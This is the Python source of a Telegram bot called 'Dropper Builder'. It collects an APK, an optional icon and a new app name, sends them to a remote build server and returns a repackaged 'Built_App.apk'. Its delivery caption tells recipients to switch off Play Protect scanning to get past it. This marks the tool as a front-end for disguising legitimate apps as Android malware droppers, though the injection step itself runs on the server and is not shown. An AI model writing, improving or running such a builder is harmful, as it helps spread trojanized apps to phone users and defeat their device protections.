import os
import logging
import requests
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, 
    filters, ContextTypes, ConversationHandler
)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
# DHYAN DE: RENDER_URL ke aakhir me koi slash '/' nahi hona chahiye
RENDER_URL = os.environ.get("RENDER_URL", "").rstrip("/")

WAITING_APK, WAITING_ICON, WAITING_NAME = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🚀 Build APK", callback_data="build_apk")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "🔥 **Welcome to Dropper Builder** 🔥\n\nShuru karne ke liye neeche button dabayein:"
    
    if update.message:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def build_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.edit_text("📥 **Step 1/3: APK Upload**\n\nKripya apni original APK file bhejein.", parse_mode='Markdown')
    return WAITING_APK

async def receive_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc or not doc.file_name.endswith(".apk"):
        await update.message.reply_text("❌ Ye APK file nahi hai. Kripya sahi APK bhejein.")
        return WAITING_APK

    context.user_data['apk_file_id'] = doc.file_id
    await update.message.reply_text(
        f"✅ **APK received** ({round(doc.file_size/1024/1024, 2)} MB)\n\n"
        f"🖼️ **Step 2/3: Optional — Icon**\n\nKripya ek PNG image bhejein, ya `/skip` type karein.", 
        parse_mode='Markdown'
    )
    return WAITING_ICON

async def receive_icon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text and update.message.text.lower() == "/skip":
        context.user_data['icon_file_id'] = None
        await update.message.reply_text("⏭️ Icon skip kiya.\n\n📝 **Step 3/3: App Name**\n\nApp ka naya naam bhejein, ya `/skip` type karein.", parse_mode='Markdown')
        return WAITING_NAME

    doc = update.message.document
    if not doc or not doc.mime_type == "image/png":
        await update.message.reply_text("❌ Kripya sirf PNG image bhejein.")
        return WAITING_ICON

    context.user_data['icon_file_id'] = doc.file_id
    await update.message.reply_text("✅ **Icon saved**\n\n📝 **Step 3/3: App Name**\n\nApp ka naya naam bhejein, ya `/skip` type karein.", parse_mode='Markdown')
    return WAITING_NAME

async def receive_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text and update.message.text.lower() == "/skip":
        context.user_data['app_name'] = None
    else:
        context.user_data['app_name'] = update.message.text.strip()

    msg = await update.message.reply_text("⏳ **Processing...**\nBuild shuru ho raha hai.", parse_mode='Markdown')
    
    for percent in [20, 45, 70, 90]:
        await asyncio.sleep(1)
        await msg.edit_text(f"⏳ **Processing...**\n[{'■' * (percent//10)}{'□' * (10 - percent//10)}] {percent}%", parse_mode='Markdown')

    try:
        apk_file = await context.bot.get_file(context.user_data['apk_file_id'])
        apk_url = apk_file.file_path
        
        icon_url = None
        if context.user_data.get('icon_file_id'):
            icon_file = await context.bot.get_file(context.user_data['icon_file_id'])
            icon_url = icon_file.file_path

        app_name = context.user_data.get('app_name')
        
        # Yahan URL check kiya ja raha hai
        server_endpoint = f"{RENDER_URL}/build"

        response = requests.post(server_endpoint, json={
            "apk_url": apk_url,
            "icon_url": icon_url,
            "app_name": app_name
        }, timeout=300)

        if response.status_code == 200:
            await msg.edit_text("✅ **Build complete!**\nUploading your APK...", parse_mode='Markdown')
            await update.message.reply_document(
                document=response.content,
                filename="Built_App.apk",
                caption="🔥 **APK Ready!**\n\nPlay Protect bypass ke liye pehle scan off karein."
            )
            await msg.delete()
        else:
            try:
                error_msg = response.json().get("error", "Unknown error")
            except:
                error_msg = response.text
            await msg.edit_text(f"❌ **Build Failed:**\n`{error_msg[:150]}`", parse_mode='Markdown')

    except Exception as e:
        await msg.edit_text(f"❌ **Error:**\n`{str(e)}`", parse_mode='Markdown')

    return ConversationHandler.END

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(build_start, pattern="^build_apk$")],
        states={
            WAITING_APK: [MessageHandler(filters.Document.ALL, receive_apk)],
            WAITING_ICON: [MessageHandler(filters.Document.IMAGE, receive_icon), MessageHandler(filters.TEXT & ~filters.COMMAND, receive_icon)],
            WAITING_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_name)],
        },
        fallbacks=[CommandHandler("cancel", lambda u, c: ConversationHandler.END)],
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
